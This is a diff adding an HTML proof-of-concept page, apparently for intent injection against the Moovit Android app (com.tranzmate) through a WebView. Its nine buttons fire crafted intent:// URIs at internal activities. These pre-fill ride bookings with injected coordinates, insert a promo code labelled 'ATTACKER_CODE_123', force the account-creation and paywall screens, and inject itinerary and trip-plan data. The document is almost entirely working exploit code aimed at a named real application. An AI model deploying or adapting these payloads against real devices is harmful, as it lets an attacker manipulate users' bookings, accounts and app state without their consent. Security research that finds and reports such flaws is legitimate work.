@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+  body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
+  h2 { color:#e94560; }
+  button {
+    display:block; width:100%; margin:8px 0; padding:14px;
+    background:#16213e; color:#eee; border:1px solid #e94560;
+    font-family:monospace; font-size:14px; cursor:pointer; text-align:left;
+  }
+  button:hover { background:#e94560; color:#fff; }
+  #log { margin-top:20px; background:#0f0f0f; padding:10px; min-height:60px; }
+</style>
+</head>
+<body>
+<h2>Intent Injection — Moovit WebView</h2>
+<pre id="log">Click a button to fire intent...</pre>
+
+<button onclick="fire('tod_booking')">
+  [1] TodBookingOrderActivity — Pre-fill ride booking (lat/lng injected)
+</button>
+
+<button onclick="fire('tod_order')">
+  [2] TodOrderActivity — Open existing ride order
+</button>
+
+<button onclick="fire('redeem')">
+  [3] MoovitPlusRedeemActivity — Inject promo/redeem code
+</button>
+
+<button onclick="fire('mot_welcome')">
+  [4] MotAccountCreationWelcomeActivity — Force MOT account creation
+</button>
+
+<button onclick="fire('benefit')">
+  [5] BenefitRegistrationActivity — Open benefit registration
+</button>
+
+<button onclick="fire('paywall')">
+  [6] BlockPaywallActivity — Force paywall screen
+</button>
+
+<button onclick="fire('external_itinerary')">
+  [7] ExternalItineraryActivity — Inject external itinerary
+</button>
+
+<button onclick="fire('settings')">
+  [8] SettingsActivity — Open settings directly
+</button>
+
+<button onclick="fire('trip_plan')">
+  [9] TripPlanActivity — Inject trip plan parameters
+</button>
+
+<script>
+var log = document.getElementById('log');
+
+var intents = {
+  tod_booking:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.tod.bookingflow.TodBookingOrderActivity;' +
+    'S.from_lat=32.08;S.from_lng=34.78;S.to_lat=32.07;S.to_lng=34.79;end',
+
+  tod_order:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.tod.order.TodOrderActivity;end',
+
+  redeem:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.plus.referral.MoovitPlusRedeemActivity;' +
+    'S.code=ATTACKER_CODE_123;end',
+
+  mot_welcome:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.mot.welcome.MotAccountCreationWelcomeActivity;end',
+
+  benefit:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.benefits.BenefitRegistrationActivity;end',
+
+  paywall:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.plus.paywall.BlockPaywallActivity;end',
+
+  external_itinerary:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.itinerary.external.ExternalItineraryActivity;end',
+
+  settings:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.app.general.settings.SettingsActivity;end',
+
+  trip_plan:
+    'intent://dummy#Intent;package=com.tranzmate;' +
+    'component=com.tranzmate/com.moovit.feature.tripplan.TripPlanActivity;end'
+};
+
+function fire(key) {
+  log.innerText = '[>] Firing: ' + key + '\n' + intents[key];
+  window.location = intents[key];
+}
+</script>
+</body>
+</html>
